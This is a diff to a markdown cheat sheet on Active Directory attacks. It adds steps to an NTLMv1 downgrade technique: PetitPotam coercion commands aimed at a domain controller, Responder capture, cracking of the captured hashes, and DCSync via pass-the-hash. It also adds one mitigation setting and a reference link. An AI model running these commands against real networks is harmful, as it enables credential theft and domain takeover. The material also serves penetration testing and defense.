@@ -1672,7 +1672,7 @@ klist
 
 > Net-NTLM (NTLMv1) hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user's NT hash. 
 
-:information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected machine, to get the machine account Net-NTLM v1 hash
+:information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to **NetNTLMv1 Challenge/Response authentication**. This uses the outdated encryption method DES to protect the NT/LM Hashes.
 
 Requirements:
 * LmCompatibilityLevel = 0x1: Send LM & NTLM (`reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel`)
@@ -1689,14 +1689,24 @@ Requirements:
     Challenge = 1122334455667788
     ```
 * Fire Responder: `responder -I eth0 --lm`
+* Force a callback:
+    ```ps1
+    PetitPotam.exe Responder-IP DC-IP # Patched around August 2021
+    PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users
+    ```
 * If you got some `NTLMv1 hashes`, you need to format then submit them on [crack.sh](https://crack.sh/netntlm/), or crack them with Hashcat/John
     ```ps1
     username::hostname:response:response:challenge -> NTHASH:response
     NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972
     ```
+* Now you can DCSync using the Pass-The-Hash with the DC machine account
 
 :warning: NTLMv1 with SSP(Security Support Provider) changes the server challenge and is not quite ideal for the attack, but it can be used.
 
+
+**Mitigations**: 
+
+* Set the Lan Manager authentication level to `Send NTLMv2 responses only. Refuse LM & NTLM`
 
 ### Capturing and cracking Net-NTLMv2/NTLMv2 hashes
 
@@ -3055,3 +3065,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Certified-Pre-Owned-Abusing-Active-Directory-Certificate-Services.pdf)
 * [Certified Pre-Owned - Will Schroeder - Jun 17 2021](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
 * [AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021](https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/)
+* [NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021](https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)
